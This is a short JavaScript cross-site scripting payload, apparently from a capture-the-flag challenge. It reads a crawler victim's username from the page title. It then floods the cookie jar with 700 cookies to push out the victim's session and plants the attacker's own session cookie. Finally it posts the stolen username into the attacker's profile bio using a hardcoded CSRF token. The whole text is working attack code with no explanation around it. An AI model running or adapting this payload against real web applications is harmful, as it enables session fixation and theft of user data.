//send request to / => get the crawler's username
var result;
xhr = new XMLHttpRequest();
xhr.open('GET', '/');
xhr.onreadystatechange = function() {
    result = xhr.responseText;
    dom = new DOMParser();
    result_parsed = dom.parseFromString(result, 'text/html');
    title = result_parsed.title; //The title contains the crawler's username

    //overwrite crawler's session cookie => my session cookie
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}`;
    }
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
    document.cookie = 'session=eyJjc3JmX3Rva2VuIjoiMWQ1MzdmM2FiZTE2ZDhlNTYzOTRkNTdhYzQ1NzBiYzViYWUyYmY5ZCIsInVzZXIiOiJhc2QxMjM0NTYifQ.YxhKow.W8ObXWL_MynVbqCKQDLwu2kRh_o;path=/';

    //Update my bio with my csrf_token
    xhr_2 = new XMLHttpRequest();
    xhr_2.open('POST', '/api/user/update');
    xhr_2.withCredentials = true;
    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr_2.send("bio=asdTitle:" + title + "&csrf_token=IjFkNTM3ZjNhYmUxNmQ4ZTU2Mzk0ZDU3YWM0NTcwYmM1YmFlMmJmOWQi.YxhKpQ.5ios6mVWvIhCU1wD8JQFsxeY7WU");
}
xhr.send();